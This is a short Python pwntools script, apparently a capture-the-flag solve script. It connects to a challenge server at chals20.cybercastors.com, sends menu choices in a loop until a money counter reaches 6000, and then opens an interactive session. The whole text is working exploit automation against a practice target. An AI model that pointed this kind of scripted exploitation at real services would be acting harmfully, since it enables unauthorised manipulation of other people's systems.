from pwn import *

p = remote("chals20.cybercastors.com", 14432)

for i in range(4):
    p.recvuntil("Choice:")

    p.sendline("6")

while 1:
    money = p.recvuntil("Choice:").split()[8]
    print(money)
    try:
        if(int(money) == 6000):
            p.sendline("6")
            p.interactive()
            print(p.recvuntil("Choice"))
            break
    except:
        pass
    p.sendline("0")
    p.recvuntil("Choice:")
    p.sendline("1")